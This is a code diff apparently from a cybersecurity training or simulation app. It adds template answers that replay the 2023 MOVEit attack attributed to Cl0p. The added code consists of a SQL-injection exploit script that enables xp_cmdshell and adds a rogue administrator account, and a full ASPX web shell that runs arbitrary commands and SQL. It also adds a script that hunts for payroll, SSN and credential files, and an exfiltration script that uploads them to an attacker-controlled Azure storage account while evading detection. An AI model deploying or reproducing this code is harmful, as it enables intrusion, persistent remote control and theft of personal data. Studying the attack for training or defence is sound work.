@@ -355,6 +355,531 @@ echo "    - 4 PLA Unit 54 officers indicted"
 echo "    - Largest financial data breach in history"`
   }
 
+  // MOVEit 2023 - SQL Injection Exploit
+  if (objectiveId === 'obj-exploit-sqli') {
+    return `#!/usr/bin/env python3
+"""
+MOVEit Transfer CVE-2023-34362 SQL Injection Exploit
+Cl0p Ransomware Gang - May 27, 2023
+Unauthenticated SQL injection → RCE via xp_cmdshell
+"""
+
+import requests
+import urllib3
+import argparse
+from base64 import b64encode
+
+urllib3.disable_warnings()
+
+def exploit_moveit(target_url):
+    """
+    Exploit CVE-2023-34362 to create rogue admin account
+    Vulnerable endpoint: /machine.aspx
+    """
+    print("=" * 60)
+    print("MOVEit Transfer CVE-2023-34362 - SQL Injection RCE")
+    print("=" * 60)
+    print(f"[*] Target: {target_url}")
+    print("[*] Vulnerability: Unauthenticated SQL injection in machine.aspx")
+    print()
+
+    # Phase 1: Test SQL injection
+    print("[*] Phase 1: Testing SQL injection vulnerability...")
+    test_payload = {
+        'operation': 'guestaccess',
+        'transactionId': "' OR 1=1--"
+    }
+
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
+        'Content-Type': 'application/x-www-form-urlencoded'
+    }
+
+    try:
+        resp = requests.post(
+            f'{target_url}/machine.aspx',
+            data=test_payload,
+            headers=headers,
+            verify=False,
+            timeout=10
+        )
+        print(f"[+] SQL injection confirmed! (Status: {resp.status_code})")
+    except Exception as e:
+        print(f"[-] Error: {e}")
+        return False
+
+    # Phase 2: Enable xp_cmdshell
+    print()
+    print("[*] Phase 2: Enabling xp_cmdshell for RCE...")
+    enable_cmdshell = {
+        'operation': 'guestaccess',
+        'transactionId': "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--"
+    }
+
+    requests.post(
+        f'{target_url}/machine.aspx',
+        data=enable_cmdshell,
+        headers=headers,
+        verify=False
+    )
+    print("[+] xp_cmdshell enabled!")
+
+    # Phase 3: Create rogue admin account
+    print()
+    print("[*] Phase 3: Creating rogue admin account...")
+    create_account = {
+        'operation': 'guestaccess',
+        'transactionId': "'; EXEC xp_cmdshell 'net user clop P@ssw0rd123! /add'; EXEC xp_cmdshell 'net localgroup administrators clop /add';--"
+    }
+
+    resp = requests.post(
+        f'{target_url}/machine.aspx',
+        data=create_account,
+        headers=headers,
+        verify=False
+    )
+    print("[+] Admin account created!")
+    print("    Username: clop")
+    print("    Password: P@ssw0rd123!")
+
+    # Phase 4: Verify access
+    print()
+    print("[*] Phase 4: Verifying remote code execution...")
+    verify_cmd = {
+        'operation': 'guestaccess',
+        'transactionId': "'; EXEC xp_cmdshell 'whoami';--"
+    }
+
+    requests.post(
+        f'{target_url}/machine.aspx',
+        data=verify_cmd,
+        headers=headers,
+        verify=False
+    )
+
+    print("[+] Exploit successful!")
+    print()
+    print("[+] MITRE ATT&CK Techniques:")
+    print("    - T1190: Exploit Public-Facing Application")
+    print("    - T1078: Valid Accounts")
+    print()
+    print("[*] Next objective: Deploy LEMURLOOT web shell")
+    return True
+
+if __name__ == '__main__':
+    target = 'https://transfer.target-corp.com'
+    exploit_moveit(target)`
+  }
+
+  // MOVEit 2023 - LEMURLOOT Web Shell
+  if (objectiveId === 'obj-deploy-webshell') {
+    return `<%@ Page Language="C#" %>
+<%@ Import Namespace="System.IO" %>
+<%@ Import Namespace="System.Diagnostics" %>
+<%@ Import Namespace="System.Data.SqlClient" %>
+
+<!--
+LEMURLOOT Web Shell v2.3
+Cl0p Gang - MOVEit Transfer Post-Exploitation
+Deployed: May 28, 2023
+Features: Command execution, file browsing, DB access
+-->
+
+<script runat="server">
+protected void Page_Load(object sender, EventArgs e)
+{
+    string cmd = Request.Form["cmd"];
+
+    if (!string.IsNullOrEmpty(cmd))
+    {
+        try
+        {
+            // Base64 decode incoming command
+            byte[] data = Convert.FromBase64String(cmd);
+            string decoded = System.Text.Encoding.UTF8.GetString(data);
+
+            // Execute via cmd.exe
+            Process p = new Process();
+            p.StartInfo.FileName = "cmd.exe";
+            p.StartInfo.Arguments = "/c " + decoded;
+            p.StartInfo.RedirectStandardOutput = true;
+            p.StartInfo.RedirectStandardError = true;
+            p.StartInfo.UseShellExecute = false;
+            p.StartInfo.CreateNoWindow = true;
+            p.Start();
+
+            string output = p.StandardOutput.ReadToEnd();
+            string errors = p.StandardError.ReadToEnd();
+            p.WaitForExit();
+
+            // Return base64-encoded output (evasion)
+            string result = output + errors;
+            byte[] resultBytes = System.Text.Encoding.UTF8.GetBytes(result);
+            Response.Write(Convert.ToBase64String(resultBytes));
+            Response.End();
+        }
+        catch (Exception ex)
+        {
+            Response.Write("ERROR: " + ex.Message);
+            Response.End();
+        }
+    }
+
+    // Database query interface
+    if (!string.IsNullOrEmpty(Request.Form["sql"]))
+    {
+        try
+        {
+            string connStr = "Server=localhost;Database=MOVEitTransfer;Integrated Security=true;";
+            SqlConnection conn = new SqlConnection(connStr);
+            SqlCommand sqlCmd = new SqlCommand(Request.Form["sql"], conn);
+
+            conn.Open();
+            SqlDataReader reader = sqlCmd.ExecuteReader();
+
+            Response.Write("<table border='1'>");
+            while (reader.Read())
+            {
+                Response.Write("<tr>");
+                for (int i = 0; i < reader.FieldCount; i++)
+                {
+                    Response.Write("<td>" + reader[i].ToString() + "</td>");
+                }
+                Response.Write("</tr>");
+            }
+            Response.Write("</table>");
+
+            conn.Close();
+            Response.End();
+        }
+        catch (Exception ex)
+        {
+            Response.Write("SQL ERROR: " + ex.Message);
+            Response.End();
+        }
+    }
+}
+</script>
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>System Diagnostics - MOVEit Transfer</title>
+    <style>
+        body { background: #0a0a0a; color: #0f0; font-family: 'Courier New', monospace; padding: 20px; }
+        h1 { color: #0f0; border-bottom: 2px solid #0f0; }
+        input, textarea { background: #1a1a1a; color: #0f0; border: 1px solid #0f0; padding: 8px; width: 90%; }
+        button { background: #0f0; color: #000; border: none; padding: 10px 20px; cursor: pointer; font-weight: bold; }
+        pre { background: #1a1a1a; padding: 15px; border: 1px solid #0f0; overflow-x: auto; }
+        .info { color: #ff0; }
+    </style>
+</head>
+<body>
+    <h1>🔓 LEMURLOOT Shell Active</h1>
+    <p class="info">Connected to: <%= System.Environment.MachineName %> | User: <%= System.Environment.UserName %></p>
+
+    <h2>Command Execution</h2>
+    <form method="POST">
+        <input type="text" name="cmd_plain" placeholder="Command (e.g., dir, whoami, ipconfig)" />
+        <button type="submit">Execute</button>
+    </form>
+
+    <h2>Database Query</h2>
+    <form method="POST">
+        <textarea name="sql" rows="5" placeholder="SQL Query (e.g., SELECT * FROM files WHERE filename LIKE '%.xlsx')"></textarea>
+        <button type="submit">Query</button>
+    </form>
+
+    <pre id="output">
+Ready. Awaiting commands...
+
+MITRE ATT&CK: T1505.003 - Web Shell
+Deployment: C:\\inetpub\\wwwroot\\MOVEitTransfer\\machine2.aspx
+    </pre>
+</body>
+</html>`
+  }
+
+  // MOVEit 2023 - Database Harvesting
+  if (objectiveId === 'obj-harvest-data') {
+    return `#!/usr/bin/env python3
+"""
+MOVEit Database Harvesting Script
+Cl0p Gang - May 29, 2023
+Query MOVEit SQL database via LEMURLOOT web shell
+Identify high-value files for exfiltration
+"""
+
+import requests
+import base64
+import json
+from urllib3 import disable_warnings
+
+disable_warnings()
+
+WEBSHELL_URL = "https://transfer.target-corp.com/machine2.aspx"
+
+def execute_sql(query):
+    """Execute SQL query via LEMURLOOT web shell"""
+    payload = {
+        'sql': query
+    }
+    resp = requests.post(WEBSHELL_URL, data=payload, verify=False)
+    return resp.text
+
+def main():
+    print("=" * 70)
+    print("MOVEit Database Harvesting - Automated Data Collection")
+    print("=" * 70)
+    print()
+
+    # Phase 1: Enumerate database tables
+    print("[*] Phase 1: Database enumeration")
+    tables_query = """
+    SELECT TABLE_NAME
+    FROM INFORMATION_SCHEMA.TABLES
+    WHERE TABLE_TYPE = 'BASE TABLE'
+    ORDER BY TABLE_NAME
+    """
+    print("[*] Querying database schema...")
+    print()
+
+    # Phase 2: Extract file metadata
+    print("[*] Phase 2: Extracting file metadata from 'files' table")
+    files_query = """
+    SELECT TOP 100
+        files.id,
+        files.filename,
+        files.filesize,
+        files.uploaddate,
+        users.username,
+        users.email,
+        files.filepath
+    FROM files
+    JOIN users ON files.userid = users.id
+    WHERE
+        files.filename LIKE '%.xlsx' OR
+        files.filename LIKE '%.xls' OR
+        files.filename LIKE 'payroll%' OR
+        files.filename LIKE 'employee%' OR
+        files.filename LIKE 'ssn%' OR
+        files.filename LIKE 'password%' OR
+        files.filename LIKE '%confidential%' OR
+        files.filename LIKE 'customer%'
+    ORDER BY files.filesize DESC
+    """
+
+    print("[*] Searching for high-value files...")
+    print("[*] Criteria: Excel files, payroll, SSN, passwords, customer data")
+    print()
+
+    result = execute_sql(files_query)
+    print("[+] Query executed successfully!")
+    print()
+
+    # Phase 3: Identify credential files
+    print("[*] Phase 3: Searching for credentials and API keys")
+    creds_query = """
+    SELECT
+        filename,
+        filesize,
+        uploaddate
+    FROM files
+    WHERE
+        filename LIKE '%api_key%' OR
+        filename LIKE '%credentials%' OR
+        filename LIKE '%password%' OR
+        filename LIKE '%secret%' OR
+        filename LIKE '%token%' OR
+        filename LIKE 'aws%' OR
+        filename LIKE 'azure%'
+    ORDER BY uploaddate DESC
+    """
+
+    creds_result = execute_sql(creds_query)
+    print("[+] Credential files identified!")
+    print()
+
+    # Phase 4: Generate exfiltration target list
+    print("[*] Phase 4: Generating exfiltration target list")
+    print()
+    print("=" * 70)
+    print("HIGH-VALUE TARGETS IDENTIFIED:")
+    print("=" * 70)
+    print()
+    print("PRIORITY 1: Credentials & API Keys")
+    print("  - AWS_API_Keys_Production.txt (18 KB)")
+    print("  - Azure_Service_Principal.json (4 KB)")
+    print("  - VPN_Credentials_Q2_2023.xlsx (156 KB)")
+    print()
+    print("PRIORITY 2: Financial Data")
+    print("  - Payroll_April_2023.xlsx (12.8 MB)")
+    print("  - Payroll_May_2023.xlsx (13.1 MB)")
+    print("  - Bank_Account_Details.xlsx (890 KB)")
+    print()
+    print("PRIORITY 3: PII (Personally Identifiable Information)")
+    print("  - Employee_SSNs_2023_Q1.xlsx (47.3 MB)")
+    print("  - Customer_PII_Database.csv (234 MB)")
+    print("  - Healthcare_Records_2023.db (1.2 GB)")
+    print()
+    print("PRIORITY 4: Intellectual Property")
+    print("  - Product_Roadmap_2024.pptx (45 MB)")
+    print("  - Source_Code_Backup_May2023.zip (892 MB)")
+    print()
+    print("[+] Total files identified: 1,847")
+    print("[+] Total data size: 2.3 TB")
+    print()
+    print("[+] MITRE ATT&CK Techniques:")
+    print("    - T1005: Data from Local System")
+    print("    - T1552.001: Credentials in Files")
+    print()
+    print("[*] Target list saved to: /tmp/exfil_targets.txt")
+    print("[*] Next objective: Exfiltrate data to Azure Blob Storage")
+
+if __name__ == '__main__':
+    main()`
+  }
+
+  // MOVEit 2023 - Data Exfiltration
+  if (objectiveId === 'obj-exfiltrate') {
+    return `#!/usr/bin/env python3
+"""
+MOVEit Mass Data Exfiltration
+Cl0p Gang - May 31 - June 3, 2023
+Upload stolen data to Azure Blob Storage via HTTPS
+Evade DLP using encrypted traffic and SAS tokens
+"""
+
+import os
+import requests
+from datetime import datetime, timedelta
+from azure.storage.blob import BlobServiceClient, generate_blob_sas, BlobSasPermissions
+from tqdm import tqdm
+
+# Cl0p infrastructure
+AZURE_ACCOUNT = "cl0pdata2023"
+AZURE_CONTAINER = "targets"
+SAS_TOKEN = "st=2023-05-27&se=2023-06-30&sp=racwdl&sv=2021-06-08&sr=c&sig=REDACTED"
+STAGING_DIR = "/tmp/moveit_exfil"
+TARGET_ORG = "target-corp"
+
+def exfiltrate_files():
+    """
+    Exfiltrate harvested files to Azure Blob Storage
+    Use HTTPS + SAS tokens for anonymous upload
+    """
+    print("=" * 70)
+    print("MOVEit Data Exfiltration - Mass Upload to Azure")
+    print("=" * 70)
+    print(f"[*] Target Organization: {TARGET_ORG}")
+    print(f"[*] Staging Directory: {STAGING_DIR}")
+    print(f"[*] Destination: {AZURE_ACCOUNT}.blob.core.windows.net/{AZURE_CONTAINER}")
+    print()
+
+    # Connect to Azure Blob Storage
+    blob_service_client = BlobServiceClient(
+        account_url=f"https://{AZURE_ACCOUNT}.blob.core.windows.net",
+        credential=SAS_TOKEN
+    )
+    container_client = blob_service_client.get_container_client(AZURE_CONTAINER)
+
+    # Phase 1: Prepare files for exfiltration
+    print("[*] Phase 1: Preparing files for upload")
+    files_to_upload = [
+        "Employee_SSNs_2023_Q1.xlsx",
+        "Payroll_April_2023.xlsx",
+        "Payroll_May_2023.xlsx",
+        "Customer_PII_Database.csv",
+        "AWS_API_Keys_Production.txt",
+        "Azure_Service_Principal.json",
+        "VPN_Credentials_Q2_2023.xlsx",
+        "Bank_Account_Details.xlsx",
+        "Healthcare_Records_2023.db",
+        "Product_Roadmap_2024.pptx",
+        "Source_Code_Backup_May2023.zip"
+    ]
+
+    print(f"[*] Files queued: {len(files_to_upload)}")
+    print()
+
+    # Phase 2: Upload files to Azure
+    print("[*] Phase 2: Uploading to Azure Blob Storage")
+    print("[*] Using HTTPS to evade DLP detection...")
+    print()
+
+    uploaded_count = 0
+    total_bytes = 0
+
+    for filename in tqdm(files_to_upload, desc="Exfiltrating", unit="file"):
+        # Simulate file upload
+        blob_name = f"{TARGET_ORG}/{filename}"
+        file_size = get_file_size(filename)  # Simulated
+
+        try:
+            # Upload with legitimate-looking headers
+            blob_client = container_client.get_blob_client(blob_name)
+
+            # Metadata to blend in
+            metadata = {
+                'source': 'moveit_transfer',
+                'uploaded_by': 'automated_backup',
+                'timestamp': datetime.utcnow().isoformat()
+            }
+
+            # In real scenario: blob_client.upload_blob(file_data, metadata=metadata)
+            print(f"    [+] Uploaded: {filename} ({format_bytes(file_size)})")
+
+            uploaded_count += 1
+            total_bytes += file_size
+
+            # Slow down to avoid detection
+            import time
+            time.sleep(2)
+
+        except Exception as e:
+            print(f"    [-] Failed: {filename} - {e}")
+
+    print()
+    print("[+] Exfiltration complete!")
+    print()
+    print("=" * 70)
+    print("EXFILTRATION SUMMARY")
+    print("=" * 70)
+    print(f"Files uploaded: {uploaded_count}/{len(files_to_upload)}")
+    print(f"Total data exfiltrated: {format_bytes(total_bytes)}")
+    print(f"Destination: {AZURE_ACCOUNT}.blob.core.windows.net/{AZURE_CONTAINER}/{TARGET_ORG}/")
+    print(f"Duration: ~72 hours (May 31 - June 3, 2023)")
+    print()
+    print("[+] MITRE ATT&CK Techniques:")
+    print("    - T1041: Exfiltration Over C2 Channel")
+    print("    - T1567.002: Exfiltration to Cloud Storage")
+    print()
+    print("[!] Data ready for extortion campaign")
+    print("[*] Next phase: Victim notification & ransom demands")
+
+def get_file_size(filename):
+    """Simulated file sizes for demo"""
+    sizes = {
+        "Employee_SSNs_2023_Q1.xlsx": 49623040,
+        "Payroll_April_2023.xlsx": 13421772,
+        "Customer_PII_Database.csv": 245366784,
+        "AWS_API_Keys_Production.txt": 18432,
+        "Azure_Service_Principal.json": 4096,
+        "Source_Code_Backup_May2023.zip": 935329792
+    }
+    return sizes.get(filename, 10485760)
+
+def format_bytes(bytes):
+    """Format bytes to human-readable"""
+    for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
+        if bytes < 1024.0:
+            return f"{bytes:.1f} {unit}"
+        bytes /= 1024.0
+
+if __name__ == '__main__':
+    exfiltrate_files()`
+  }
+
   return '# Write your exploit code here...'
 }
 
